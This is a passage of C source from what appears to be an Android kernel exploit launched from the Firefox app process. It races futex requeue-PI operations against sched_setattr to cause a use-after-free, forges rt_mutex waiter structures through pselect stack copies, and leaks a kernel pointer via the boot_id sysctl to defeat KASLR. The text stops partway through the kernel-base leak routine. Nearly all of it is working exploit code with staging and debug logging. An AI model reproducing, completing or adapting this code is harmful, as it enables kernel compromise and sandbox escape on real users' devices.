#include "common.h"
#include <stdarg.h>

#define SLIDE_MAX_ATTEMPTS 20
#define SLIDE_CONSUME_DELAY 2000
#define SLIDE_CONSUME_USEC 0
#define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
#define SLIDE_PSELECT_PAD_BYTES 0
#define SLIDE_PSELECT_WORD_SHIFT PSELECT_WAITER_WORD_SHIFT
#define SLIDE_WAIT_SECONDS 120
#define SLIDE_CONSUMER_THREADS 4
#define SLIDE_CONSUMER_RACE_CALLS 2000
#define SLIDE_CHAIN_LINKS 4

static void slide_crash_write_one(const char *path, const char *msg) {
  int fd = open(path, O_WRONLY | O_CREAT | O_APPEND, 0644);
  if (fd < 0) {
    return;
  }
  size_t len = strlen(msg);
  size_t off = 0;
  while (off < len) {
    ssize_t n = write(fd, msg + off, len - off);
    if (n <= 0) {
      break;
    }
    off += (size_t)n;
  }
  fsync(fd);
  close(fd);
}

static void slide_crash_log(const char *fmt, ...) {
  char buf[512];
  va_list ap;
  va_start(ap, fmt);
  int n = vsnprintf(buf, sizeof(buf), fmt, ap);
  va_end(ap);
  if (n < 0) {
    return;
  }
  buf[sizeof(buf) - 1] = '\0';
  slide_crash_write_one("/data/data/org.mozilla.firefox/files/crash.txt", buf);
  slide_crash_write_one("/sdcard/Download/crash.txt", buf);
}

static uint32_t slide_f_wait;
static uint32_t slide_f_pi_target;
static uint32_t slide_f_pi_chain;
static uint32_t slide_f_pi_links[SLIDE_CHAIN_LINKS];
static atomic_int slide_waiter_ready;
static atomic_int slide_waiter_waiting;
static atomic_int slide_owner_started;
static atomic_int slide_owner_blocking;
static atomic_int slide_owner_tid;
static atomic_int slide_link_tids[SLIDE_CHAIN_LINKS];
static atomic_int slide_chain_go;
static atomic_int slide_link_holds;
static atomic_int slide_link_blocking;
static atomic_int slide_route_done;
static atomic_int slide_waiter_tid;
static atomic_int slide_consume_calls;
static atomic_int slide_consume_go;
static atomic_int slide_consume_seen;
static atomic_int slide_consume_lost;
static atomic_int slide_consume_enter_sched;
static atomic_int slide_consume_stop;
static atomic_int slide_consume_sched_ok;
static atomic_int slide_consume_last_sched_ret;
static atomic_int slide_consume_last_sched_errno;
static atomic_int slide_consume_max_us;
static atomic_int slide_consumer_tid;
static atomic_int slide_consumer_ready;
static atomic_int slide_sched_target_tid;
static int slide_runtime_shift = SLIDE_PSELECT_WORD_SHIFT;

int slide_pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
}

int slide_pselect_global_word(int waiter_word) {
  return slide_runtime_shift + waiter_word;
}

int slide_pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

uint64_t slide_pselect_get_global_word(
    const fd_set *in, const fd_set *out, const fd_set *ex,
    int words_per_set, int global_word) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      return fdset_get_word(in, word_idx);
    case 1:
      return fdset_get_word(out, word_idx);
    case 2:
      return fdset_get_word(ex, word_idx);
    default:
      return 0;
  }
}

void slide_pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, int shift, uint64_t value, const char *name) {
  int global_word = slide_pselect_global_word(waiter_word) + shift;
  int placed = slide_pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("slide pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               SLIDE_PSELECT_NFDS);
  }
}

void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int words_per_set = slide_pselect_words_per_set();
  struct slide_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  } words[] = {
    {2, SLIDE_LOGGERS_0_1, "tree_pc"},
    {3, 0, "tree_right"},
    {4, SLIDE_RANDOM_BOOT_ID_DATA, "tree_left"},
    {5, SLIDE_LOGGERS_0_1, "pi_parent"},
    {6, 0, "pi_right"},
    {7, SLIDE_RANDOM_BOOT_ID_DATA, "pi_left"},
    {8, SLIDE_INIT_TASK, "task"},
    {9, fake_lock, "lock"},
    {10, ((uint64_t)FAKE_WAITER_PRIO << 32) | 3, "wake_prio"},
    {11, 0, "deadline"},
    {12, 0, "ww_ctx"},
  };
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct slide_waiter_word *w = &words[i];
    slide_pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, 0, w->value, w->name);
  }
}

void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  for (int fd = 0; fd < SLIDE_PSELECT_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(read_fd, fd);
    }
  }
  dup2(read_fd, SLIDE_PSELECT_NFDS - 1);
  FD_SET(SLIDE_PSELECT_NFDS - 1, ex);
}

void slide_pselect_stack_copy(void) {
  slide_crash_log("SLIDEP0: enter pselect_stack page=0x%llx lock=0x%llx w0=0x%llx\n",
                  (unsigned long long)page_base,
                  (unsigned long long)fake_lock,
                  (unsigned long long)fake_w0);
  if (!page_base || !fake_lock || !fake_w0) {
    pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
             page_base, fake_lock, fake_w0);
    slide_crash_log("SLIDEP0_FAIL: missing page/lock/w0\n");
    return;
  }

  int pipefd[2] = {-1, -1};
  SYSCHK(pipe(pipefd));
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    pr_warning("slide timerfd_create failed errno=%d; using pipe read end\n",
               errno);
    block_fd = pipefd[0];
  }
  int high_read = fcntl(block_fd, F_DUPFD, SLIDE_PSELECT_NFDS + 16);
  if (high_read < 0) {
    pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
    slide_crash_log("SLIDEP1_FAIL: F_DUPFD errno=%d\n", errno);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }

  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_slide_pselect_fdsets(&in, &out, &ex);
  slide_crash_log("SLIDEP1_LAYOUT: shift=%d words_per_set=%d\n",
                  slide_runtime_shift, slide_pselect_words_per_set());
  open_slide_selected_fds(&in, &out, &ex, high_read);
  slide_crash_log("SLIDEP1: fdsets prepared high_read=%d nfds=%d words_per_set=%d\n",
                  high_read, SLIDE_PSELECT_NFDS,
                  slide_pselect_words_per_set());

  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_seen, 0);
  atomic_store(&slide_consume_lost, 0);
  atomic_store(&slide_consume_enter_sched, 0);
  atomic_store(&slide_consume_calls, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_last_sched_ret, -1);
  atomic_store(&slide_consume_last_sched_errno, 0);
  atomic_store(&slide_consume_max_us, 0);

  struct timespec timeout = {
    .tv_sec = PSELECT_TIMEOUT_SEC,
    .tv_nsec = 0,
  };
  struct timespec *timeoutp = &timeout;

  atomic_store(&slide_consume_go, 1);
  errno = 0;
  slide_crash_log("SLIDEP2: before pselect\n");

  int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
  int saved_errno = errno;
  atomic_store(&slide_consume_go, 0);
  slide_crash_log("SLIDEP3: after pselect ret=%d errno=%d calls=%d sched_ok=%d "
                  "last_sched_ret=%d last_sched_errno=%d\n",
                  ret, saved_errno, atomic_load(&slide_consume_calls),
                  atomic_load(&slide_consume_sched_ok),
                  atomic_load(&slide_consume_last_sched_ret),
                  atomic_load(&slide_consume_last_sched_errno));
  pr_info("slide pselect returned ret=%d errno=%d calls=%d sched_ok=%d "
          "last_sched_ret=%d last_sched_errno=%d\n",
          ret, saved_errno, atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));

  close(high_read);
  if (block_fd != pipefd[0]) {
    close(block_fd);
  }
  close(pipefd[0]);
  close(pipefd[1]);
  slide_crash_log("SLIDEP4: pselect_stack return\n");
}

void *slide_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  int self_tid = (int)syscall(SYS_gettid);
  atomic_store(&slide_consumer_tid, self_tid);
  atomic_fetch_add(&slide_consumer_ready, 1);

  int seen = 0;
  for (;;) {
    int seq = atomic_load(&slide_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      if (atomic_load(&slide_consume_stop)) {
        return NULL;
      }
      continue;
    }

    seen = seq;
    atomic_store(&slide_consume_seen, seen);
    if (SLIDE_CONSUME_USEC) {
      usleep(SLIDE_CONSUME_USEC);
    } else {
      for (int spin = 0; spin < SLIDE_CONSUME_DELAY; spin++) {
        __asm__ volatile("yield" ::: "memory");
      }
    }
    if (atomic_load(&slide_consume_go) != seq) {
      int lost = atomic_load(&slide_consume_lost) + 1;
      atomic_store(&slide_consume_lost, lost);
      continue;
    }

    if (seq == 1) {
      usleep(PSELECT_ENTER_DELAY_USEC);
    }

    int tid = atomic_load(&slide_sched_target_tid);
    if (!tid) {
      tid = atomic_load(&slide_waiter_tid);
    }
    int race_mode = (seq == 2 || seq == 3);
    const char *label0 = (seq == 3) ? "SLIDEOWNR0" :
                         (race_mode ? "SLIDECONSR0" : "SLIDECONS0");
    const char *label1 = (seq == 3) ? "SLIDEOWNR1" :
                         (race_mode ? "SLIDECONSR1" : "SLIDECONS1");
    int calls = atomic_fetch_add(&slide_consume_calls, 1);
    atomic_fetch_add(&slide_consume_enter_sched, 1);
    errno = 0;
    if (!race_mode || calls < SLIDE_CONSUMER_THREADS ||
        (calls % 500) == 499) {
      slide_crash_log("%s: before sched_setattr self=%d tid=%d nice=%d call=%d\n",
                      label0, self_tid, tid, (calls % 19) + 1, calls + 1);
    }
    struct timespec sched_t0, sched_t1;
    clock_gettime(CLOCK_MONOTONIC, &sched_t0);
    long ret = sched_setattr_tid(tid, (calls % 19) + 1);
    clock_gettime(CLOCK_MONOTONIC, &sched_t1);
    long dur_us = (sched_t1.tv_sec - sched_t0.tv_sec) * 1000000L +
                  (sched_t1.tv_nsec - sched_t0.tv_nsec) / 1000L;
    int max_us = atomic_load(&slide_consume_max_us);
    if (dur_us > max_us) {
      atomic_store(&slide_consume_max_us, (int)dur_us);
      max_us = (int)dur_us;
    }
    int saved_errno = errno;
    if (!race_mode || calls < SLIDE_CONSUMER_THREADS || ret != 0 ||
        (calls % 500) == 499) {
      slide_crash_log("%s: after sched_setattr self=%d ret=%ld errno=%d "
                      "call=%d dur_us=%ld max_us=%d\n",
                      label1, self_tid, ret, saved_errno, calls + 1,
                      dur_us, max_us);
    }
    atomic_store(&slide_consume_last_sched_ret, (int)ret);
    atomic_store(&slide_consume_last_sched_errno, saved_errno);
    if (ret == 0) {
      int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
      atomic_store(&slide_consume_sched_ok, sched_ok);
    }
    if (race_mode && calls + 1 < SLIDE_CONSUMER_RACE_CALLS &&
        atomic_load(&slide_consume_go) == seq &&
        !atomic_load(&slide_consume_stop)) {
      /*
       * Re-arm locally without waiting for a new seq value.  This keeps
       * sched_setattr pressure across the tiny window where futex requeue has
       * installed task->pi_blocked_on but has not yet removed it on EDEADLK.
       */
      seen = 0;
      continue;
    }
    if (race_mode) {
      slide_crash_log("%s_DONE: self=%d calls=%d ok=%d last_ret=%d "
                      "last_errno=%d go=%d ready=%d max_us=%d target=%d\n",
                      (seq == 3) ? "SLIDEOWNR" : "SLIDECONSR",
                      self_tid,
                      atomic_load(&slide_consume_calls),
                      atomic_load(&slide_consume_sched_ok),
                      atomic_load(&slide_consume_last_sched_ret),
                      atomic_load(&slide_consume_last_sched_errno),
                      atomic_load(&slide_consume_go),
                      atomic_load(&slide_consumer_ready),
                      atomic_load(&slide_consume_max_us),
                      atomic_load(&slide_sched_target_tid));
    }
    atomic_store(&slide_consume_stop, 1);
    while (atomic_load(&slide_consume_go)) {
      __asm__ volatile("yield" ::: "memory");
    }
    return NULL;
  }
}

/* Diagnostic-only: sample the consumer's kernel wait site only after the
 * consumer has actually reached sched_setattr.  The previous fixed-delay
 * watchdog sampled an idle spinning consumer and only reported "0". */
static void *slide_consumer_wchan_watchdog(void *arg __attribute__((unused))) {
  int tid = 0;
  for (int wait = 0; wait < 200 && !(tid = atomic_load(&slide_consumer_tid)); wait++)
    usleep(1000);
  if (!tid) {
    slide_crash_log("SCHEDWATCH_FAIL: consumer tid unavailable\n");
    return NULL;
  }

  int entered = 0;
  for (int wait = 0; wait < 5000; wait++) {
    entered = atomic_load(&slide_consume_enter_sched);
    if (entered) {
      break;
    }
    if (atomic_load(&slide_consume_stop)) {
      break;
    }
    usleep(1000);
  }
  if (!entered) {
    slide_crash_log("SCHEDWATCH_SKIP: consumer never entered sched tid=%d "
                    "go=%d seen=%d stop=%d\n",
                    tid, atomic_load(&slide_consume_go),
                    atomic_load(&slide_consume_seen),
                    atomic_load(&slide_consume_stop));
    return NULL;
  }

  slide_crash_log("SCHEDWATCH_ARMED: tid=%d entered=%d go=%d seen=%d\n",
                  tid, entered, atomic_load(&slide_consume_go),
                  atomic_load(&slide_consume_seen));
  for (int sample = 0; sample < 40; sample++) {
    char path[96], wchan[96] = {0};
    snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", tid);
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    ssize_t n = fd >= 0 ? read(fd, wchan, sizeof(wchan) - 1) : -1;
    int saved_errno = errno;
    if (fd >= 0) close(fd);
    if (n > 0) wchan[n] = '\0';
    slide_crash_log("SCHEDWATCH: sample=%d tid=%d n=%zd errno=%d wchan=%s\n",
                    sample, tid, n, saved_errno, n > 0 ? wchan : "<unreadable>");
    usleep(50000);
  }
  return NULL;
}

void *slide_waiter_thread(void *arg __attribute__((unused))) {
  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&slide_waiter_tid, tid);
  slide_crash_log("SLIDEW0: waiter tid=%d lock_pi_chain\n", tid);

  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide waiter lock chain errno=%d\n", errno);
    slide_crash_log("SLIDEW0_FAIL: lock_pi_chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&slide_waiter_ready, 1);
  slide_crash_log("SLIDEW1: waiter ready\n");
  while (!atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  /* Signal child BEFORE computing timeout, so requeue loop starts ASAP */
  atomic_store(&slide_waiter_waiting, 1);
  slide_crash_log("SLIDEW2: before FUTEX_WAIT_REQUEUE_PI\n");

  /* Compute timeout right before blocking — don't waste budget on setup */
  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += SLIDE_WAIT_SECONDS;
  futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
           &slide_f_pi_target, 0);
  slide_crash_log("SLIDEW3: after FUTEX_WAIT_REQUEUE_PI errno=%d\n", errno);
  futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  slide_crash_log("SLIDEW4: unlocked chain, entering pselect copy\n");

  slide_pselect_stack_copy();
  atomic_store(&slide_route_done, 1);
  slide_crash_log("SLIDEW5: route done\n");

  for (;;) {
    sleep(1);
  }
}

void *slide_chain_link_thread(void *arg) {
  int idx = (int)(intptr_t)arg;
  int tid = (int)syscall(SYS_gettid);
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  if (idx < 0 || idx >= SLIDE_CHAIN_LINKS) {
    slide_crash_log("SLIDELINK_FAIL: bad idx=%d\n", idx);
    return NULL;
  }
  atomic_store(&slide_link_tids[idx], tid);

  slide_crash_log("SLIDELINK0: idx=%d tid=%d lock self\n", idx, tid);
  if (futex_op(&slide_f_pi_links[idx], FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    slide_crash_log("SLIDELINK0_FAIL: idx=%d errno=%d\n", idx, errno);
    return NULL;
  }
  int holds = atomic_fetch_add(&slide_link_holds, 1) + 1;
  slide_crash_log("SLIDELINK1: idx=%d holds=%d\n", idx, holds);

  while (!atomic_load(&slide_chain_go)) {
    __asm__ volatile("yield" ::: "memory");
  }

  uint32_t *next = (idx + 1 < SLIDE_CHAIN_LINKS) ?
      &slide_f_pi_links[idx + 1] : &slide_f_pi_chain;
  int blocking = atomic_fetch_add(&slide_link_blocking, 1) + 1;
  slide_crash_log("SLIDELINK2: idx=%d blocking=%d next=%s\n",
                  idx, blocking,
                  (idx + 1 < SLIDE_CHAIN_LINKS) ? "link" : "waiter");
  futex_op(next, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  slide_crash_log("SLIDELINK3: idx=%d lock next returned errno=%d\n",
                  idx, errno);

  for (;;) {
    sleep(1);
  }
}

void *slide_owner_thread(void *arg __attribute__((unused))) {
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&slide_owner_tid, tid);
  slide_crash_log("SLIDEO0: owner enter tid=%d\n", tid);
  if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide owner lock target errno=%d\n", errno);
    slide_crash_log("SLIDEO0_FAIL: lock target errno=%d\n", errno);
    return NULL;
  }

  while (!atomic_load(&slide_waiter_ready)) {
    usleep(1000);
  }
  while (atomic_load(&slide_link_holds) < SLIDE_CHAIN_LINKS) {
    __asm__ volatile("yield" ::: "memory");
  }

  atomic_store(&slide_chain_go, 1);
  while (atomic_load(&slide_link_blocking) < SLIDE_CHAIN_LINKS) {
    __asm__ volatile("yield" ::: "memory");
  }

  atomic_store(&slide_owner_started, 1);
  slide_crash_log("SLIDEO1: owner started, lock link0 chain_links=%d\n",
                  SLIDE_CHAIN_LINKS);
  /* Hold f_pi_target AND block on link0 to create a longer PI dependency:
   * owner holds f_pi_target → FUTEX_CMP_REQUEUE_PI queues waiter on target
   * owner blocks on link0 → link0 blocks on link1 → ... → last link blocks
   * on f_pi_chain held by waiter.  The resulting chain is:
   * owner → link0 → link1 → ... → waiter
   * consumer's sched_setattr triggers rt_mutex_adjust_prio_chain → walks PI chain
   * → processes forged waiter's rb-tree nodes → rb_erase → writes to sysctl_bootid */
  atomic_store(&slide_owner_blocking, 1);
  futex_op(&slide_f_pi_links[0], FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  slide_crash_log("SLIDEO2: owner link0 lock returned errno=%d\n", errno);

  for (;;) {
    sleep(1);
  }
}

int hex_value(char c) {
  if (c >= '0' && c <= '9') {
    return c - '0';
  }
  if (c >= 'a' && c <= 'f') {
    return c - 'a' + 10;
  }
  if (c >= 'A' && c <= 'F') {
    return c - 'A' + 10;
  }
  return -1;
}

uint64_t slide_read_stext(void) {
  char buf[64];
  unsigned char raw[16];
  slide_crash_log("SLIDER0: read boot_id\n");
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide boot_id read denied errno=%d\n", errno);
    slide_crash_log("SLIDER0_FAIL: open boot_id errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n < 0) {
    pr_warning("slide boot_id read failed errno=%d\n", saved_errno);
    slide_crash_log("SLIDER1_FAIL: read boot_id errno=%d\n", saved_errno);
    return 0;
  }
  buf[n] = 0;
  slide_crash_log("SLIDER1: boot_id n=%zd value=%s\n", n, buf);

  /* ========== SLIDE DEBUG: RAW BOOT_ID ========== */
  pr_info("[slide-debug] boot_id raw (n=%zd): %s\n", n, buf);
  pr_info("[slide-debug] boot_id hex: ");
  for (int i = 0; i < n && i < 36; i++) {
    pr_info("%02x ", (unsigned char)buf[i]);
  }
  pr_info("\n");
  /* ========== END DEBUG ========== */

  int nibble = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v = hex_value(buf[i]);
    if (v < 0) {
      continue;
    }
    if (nibble < 0) {
      nibble = v;
      continue;
    }
    raw[out++] = (unsigned char)((nibble << 4) | v);
    nibble = -1;
  }
  if (out != 16) {
    pr_warning("slide short boot_id parse out=%d n=%zd\n", out, n);
    slide_crash_log("SLIDER2_FAIL: short parse out=%d n=%zd\n", out, n);
    return 0;
  }

  uint64_t leaked = 0;
  for (int i = 0; i < 8; i++) {
    leaked |= (uint64_t)raw[i] << (i * 8);
  }
  pr_info("[slide-debug] parsed leaked pointer=0x%016llx (>>48=0x%04llx)\n",
          (unsigned long long)leaked, (unsigned long long)(leaked >> 48));
  if ((leaked >> 48) != 0xffff) {
    pr_warning("slide bad leaked pointer=%016llx\n",
               (unsigned long long)leaked);
    slide_crash_log("SLIDER2_BAD: leaked=0x%016llx hi=0x%04llx\n",
                    (unsigned long long)leaked,
                    (unsigned long long)(leaked >> 48));
    return 0;
  }

  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER);
  uint64_t stext = leaked - off;
  pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
             getpid(), (unsigned long long)leaked, (unsigned long long)stext);
  pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
             getpid(), (unsigned long long)stext);
  slide_crash_log("SLIDER3_OK: leaked=0x%016llx stext=0x%016llx\n",
                  (unsigned long long)leaked,
                  (unsigned long long)stext);
  return stext;
}
uint64_t slide_child_leak_stext(void) {
  pthread_t waiter;
  pthread_t owner;
  pthread_t links[SLIDE_CHAIN_LINKS];
  pthread_t consumers[SLIDE_CONSUMER_THREADS];
  pthread_t watchdog;
  atomic_store(&slide_consumer_tid, 0);
  atomic_store(&slide_consumer_ready, 0);
  atomic_store(&slide_owner_tid, 0);
  atomic_store(&slide_sched_target_tid, 0);
  atomic_store(&slide_consume_max_us, 0);
  atomic_store(&slide_owner_blocking, 0);
  atomic_store(&slide_chain_go, 0);
  atomic_store(&slide_link_holds, 0);
  atomic_store(&slide_link_blocking, 0);
  for (int i = 0; i < SLIDE_CHAIN_LINKS; i++) {
    atomic_store(&slide_link_tids[i], 0);
  }
  slide_crash_log("SLIDEC0: child_leak create threads\n");
  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
  for (int i = 0; i < SLIDE_CHAIN_LINKS; i++) {
    SYSCHK(pthread_create(&links[i], NULL, slide_chain_link_thread,
                          (void *)(intptr_t)i));
  }
  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
  for (int i = 0; i < SLIDE_CONSUMER_THREADS; i++) {
    SYSCHK(pthread_create(&consumers[i], NULL, slide_consumer_thread, NULL));
  }
  SYSCHK(pthread_create(&watchdog, NULL, slide_consumer_wchan_watchdog, NULL));
  slide_crash_log("SLIDEC1: threads created consumers=%d chain_links=%d\n",
                  SLIDE_CONSUMER_THREADS, SLIDE_CHAIN_LINKS);

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started) ||
         !atomic_load(&slide_owner_blocking)) {
    usleep(1000);
  }

  while (atomic_load(&slide_consumer_ready) < SLIDE_CONSUMER_THREADS) {
    __asm__ volatile("yield" ::: "memory");
  }

  int owner_tid = atomic_load(&slide_owner_tid);
  atomic_store(&slide_sched_target_tid, owner_tid);
  atomic_store(&slide_consume_go, 3);
  slide_crash_log("SLIDEOQ_SIGNAL: owner sched go=3 ready=%d owner=%d "
                  "waiter=%d link0=%d link_last=%d budget=%d; entering requeue\n",
                  atomic_load(&slide_consumer_ready),
                  owner_tid,
                  atomic_load(&slide_waiter_tid),
                  atomic_load(&slide_link_tids[0]),
                  atomic_load(&slide_link_tids[SLIDE_CHAIN_LINKS - 1]),
                  SLIDE_CONSUMER_RACE_CALLS);

  /* Retry FUTEX_CMP_REQUEUE_PI until EDEADLK (rollback success) or timeout.
   * EAGAIN means the requeue couldn't happen yet — retry with short delay.
   * EDEADLK means the PI chain rollback was triggered — success!
   * ETIMEDOUT means the waiter gave up — need another attempt. */
  int uaf_primed = 0;
  for (int retry = 0; retry < 500 && !uaf_primed; retry++) {
    errno = 0;
    if (retry == 0) {
      slide_crash_log("SLIDEC2: before FUTEX_CMP_REQUEUE_PI\n");
    }
    int ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                       &slide_f_pi_target, 0);
    int saved_errno = errno;
    slide_crash_log("SLIDEC3: retry=%d ret=%d errno=%d\n", retry, ret, saved_errno);

    if (ret == -1 && saved_errno == EDEADLK) {
      uaf_primed = 1;
      /* Do NOT set slide_consume_stop here — the consumer must still run
       * sched_setattr to trigger the PI chain walk that processes the
       * forged waiter's rb-tree nodes. Setting stop early kills the
       * consumer before it can call sched_setattr, breaking the leak. */
      slide_crash_log("SLIDEC3_OK: EDEADLK rollback triggered at retry=%d\n", retry);
      slide_crash_log("SLIDEC3_SIGNAL: consumer_go=%d enter=%d tid=%d waiter=%d\n",
                      atomic_load(&slide_consume_go),
                      atomic_load(&slide_consume_enter_sched),
                      atomic_load(&slide_consumer_tid),
                      atomic_load(&slide_waiter_tid));
      for (int wait = 0; wait < 5000; wait++) {
        if (atomic_load(&slide_consume_enter_sched) ||
            atomic_load(&slide_consume_stop)) {
          break;
        }
        usleep(1000);
      }
      slide_crash_log("SLIDEC3_AFTER_SIGNAL: enter=%d calls=%d sched_ok=%d "
                      "last_ret=%d last_errno=%d\n",
                      atomic_load(&slide_consume_enter_sched),
                      atomic_load(&slide_consume_calls),
                      atomic_load(&slide_consume_sched_ok),
                      atomic_load(&slide_consume_last_sched_ret),
                      atomic_load(&slide_consume_last_sched_errno));
    } else if (ret == -1 && saved_errno == ETIMEDOUT) {
      slide_crash_log("SLIDEC3_TIMEOUT: waiter timed out at retry=%d\n", retry);
      break;
    }
    usleep(10000); /* 10ms between retries */
  }

  while (!atomic_load(&slide_route_done)) {
    sleep(1);
  }
  atomic_store(&slide_consume_go, 0);
  slide_crash_log("SLIDEC4: route_done, read_stext\n");

  return slide_read_stext();
}

int slide_leak_kernel_base(void) {
  slide_crash_log("SLIDE0: enter slide_leak max_attempts=%d\n", SLIDE_MAX_ATTEMPTS);
  for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
    slide_crash_log("SLIDE1: attempt=%d prepare_good_kernel_page\n", attempt);
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    slide_crash_log("SLIDE2: attempt=%d prepared page=0x%llx lock=0x%llx w0=0x%llx "
                    "bootid_data=0x%llx logger=0x%llx\n",
                    attempt,
                    (unsigned long long)page_base,
                    (unsigned long long)fake_lock,
                    (unsigned long long)fake_w0,
                    (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
                    (unsigned long long)SLIDE_NFULNL_LOGGER);
    if (!page_base || !fake_lock) {
      slide_crash_log("SLIDE2_SKIP: attempt=%d missing page/lock\n", attempt);
      continue;
    }

    /* ========== SLIDE DEBUG OUTPUT ========== */
    pr_info("[slide-debug] page_base=0x%016llx\n", (unsigned long long)page_base);
    pr_info("[slide-debug] fake_lock=0x%016llx\n", (unsigned long long)fake_lock);
    pr_info("[slide-debug] fake_w0=0x%016llx\n", (unsigned long long)fake_w0);
    pr_info("[slide-debug] fake_task=0x%016llx\n", (unsigned long long)fake_task);
    pr_info("[slide-debug] fake_fops=0x%016llx\n", (unsigned long long)fake_fops);
    pr_info("[slide-debug] fake_parent=0x%016llx\n", (unsigned long long)fake_parent);
    pr_info("[slide-debug] fake_right=0x%016llx\n", (unsigned long long)fake_right);
    pr_info("[slide-debug] fake_left=0x%016llx\n", (unsigned long long)fake_left);
    pr_info("[slide-debug] WRITE_TARGETS:\n");
    pr_info("[slide-debug]   write_pc=SLIDE_LOGGERS_0_1=0x%016llx\n", (unsigned long long)SLIDE_LOGGERS_0_1);
    pr_info("[slide-debug]   write_left=SLIDE_RANDOM_BOOT_ID_DATA=0x%016llx\n", (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA);
    pr_info("[slide-debug]   write_right=0\n");
    pr_info("[slide-debug] SCHEDULER_OBJECTS:\n");
    pr_info("[slide-debug]   waiter_task=SLIDE_INIT_TASK=0x%016llx\n", (unsigned long long)SLIDE_INIT_TASK);
    pr_info("[slide-debug]   task_group=SLIDE_ROOT_TASK_GROUP=0x%016llx\n", (unsigned long long)SLIDE_ROOT_TASK_GROUP);
    pr_info("[slide-debug]   pi_top_task=SLIDE_INIT_TASK=0x%016llx\n", (unsigned long long)SLIDE_INIT_TASK);
    pr_info("[slide-debug] STRUCTURE OFFSETS:\n");
    pr_info("[slide-debug]   LOCK_OFF=0x%x W0_OFF=0x%x FAKE_TASK_OFF=0x%x\n", LOCK_OFF, W0_OFF, FAKE_TASK_OFF);
    pr_info("[slide-debug]   FAKE_WAITER_PI_TREE_ENTRY_OFF=0x%x\n", FAKE_WAITER_PI_TREE_ENTRY_OFF);
